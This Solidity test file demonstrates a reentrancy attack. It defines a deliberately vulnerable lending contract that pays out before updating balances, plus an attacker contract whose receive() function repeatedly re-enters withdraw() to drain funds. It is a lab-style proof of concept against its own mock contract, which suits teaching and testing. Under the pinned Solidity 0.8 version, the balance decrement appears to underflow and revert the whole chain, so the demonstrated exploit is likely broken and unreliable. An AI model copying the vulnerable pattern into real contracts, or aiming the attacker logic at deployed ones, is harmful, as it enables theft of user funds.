// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "./basetest.sol";

// @KeyInfo - Vulnerability: Reentrancy
// This test demonstrates a reentrancy attack on a vulnerable lending contract

contract ReentrancyTest is BaseTestWithBalanceLog {
    VulnerableLendingContract public vulnerableLending;
    AttackerContract public attacker;
    
    function setUp() public {
        // Deploy the vulnerable contract
        vulnerableLending = new VulnerableLendingContract();
        
        // Fund the vulnerable contract
        vm.deal(address(this), 100 ether);
        (bool success, ) = address(vulnerableLending).call{value: 10 ether}("");
        require(success, "Funding failed");
        
        // Deploy the attacker contract
        attacker = new AttackerContract(address(vulnerableLending));
        vm.deal(address(attacker), 1 ether);
    }
    
    function testExploit() public balanceLog {
        console.log("Starting reentrancy attack demonstration");
        
        // Initial state
        console.log("Initial vulnerable contract balance:", address(vulnerableLending).balance);
        console.log("Initial attacker balance:", address(attacker).balance);
        
        // Deposit from attacker
        vm.prank(address(attacker));
        vulnerableLending.deposit{value: 1 ether}();
        
        // Execute attack
        attacker.attack();
        
        // Final state
        console.log("Final vulnerable contract balance:", address(vulnerableLending).balance);
        console.log("Final attacker balance:", address(attacker).balance);
        
        // Verify the attack was successful
        assertGt(address(attacker).balance, 1 ether, "Attack did not extract additional funds");
    }
}

contract VulnerableLendingContract {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // Vulnerable: state update after external call
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount;
    }
}

contract AttackerContract {
    VulnerableLendingContract public vulnerableLending;
    uint256 public attackAmount = 1 ether;
    
    constructor(address _vulnerableLending) {
        vulnerableLending = VulnerableLendingContract(_vulnerableLending);
    }
    
    function attack() external {
        vulnerableLending.withdraw(attackAmount);
    }
    
    // Fallback function that gets triggered when receiving ETH
    receive() external payable {
        if (address(vulnerableLending).balance >= attackAmount) {
            vulnerableLending.withdraw(attackAmount);
        }
    }
}